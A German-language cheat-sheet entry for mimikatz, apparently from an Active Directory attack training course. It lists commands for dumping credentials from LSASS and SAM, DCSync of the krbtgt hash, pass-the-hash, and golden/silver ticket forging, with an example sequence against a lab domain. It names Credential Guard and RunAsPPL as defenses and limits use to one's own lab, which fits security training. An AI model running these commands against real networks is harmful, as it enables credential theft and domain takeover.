# mimikatz

**Kategorie:** AD/Windows – Credential-Dumping & Ticket-Angriffe · läuft **auf Windows**

Das klassische Windows-Post-Exploitation-Tool: extrahiert Klartext-/NTLM-Credentials und Tickets aus **LSASS**, dumpt die **SAM**, führt **DCSync**, Pass-the-Hash/Ticket und **Golden/Silver Ticket** aus. Braucht lokale Admin-/SYSTEM-Rechte.

```
mimikatz.exe
privilege::debug
```

## Wichtigste Befehle

| Befehl | Zweck |
|--------|-------|
| `privilege::debug` | Debug-Privileg (Voraussetzung) |
| `sekurlsa::logonpasswords` | LSASS: Credentials angemeldeter User |
| `lsadump::sam` | lokale SAM-Hashes |
| `lsadump::dcsync /user:krbtgt` | **DCSync** (Hashes replizieren) |
| `sekurlsa::pth` | Pass-the-Hash |
| `kerberos::golden` / `::ptt` | Golden/Silver Ticket erzeugen/injizieren |

## Beispiel

```
privilege::debug
sekurlsa::logonpasswords
lsadump::dcsync /domain:lab.local /user:krbtgt
```

## Hinweis

Stark AV/EDR-geflaggt (im Lab AV aus/Ausnahme). **Credential Guard / RunAsPPL** vereiteln `sekurlsa::logonpasswords` – genau das ist die Abwehr. Von Kali aus sind viele Funktionen über **Impacket** (`secretsdump.py`, `ticketer.py`) abgedeckt. Nur eigenes AD-Lab.

## Verwendet in

active-directory-attacks 08 (Credential Dumping/PtH), 09 (DCSync/Golden Ticket), 10.
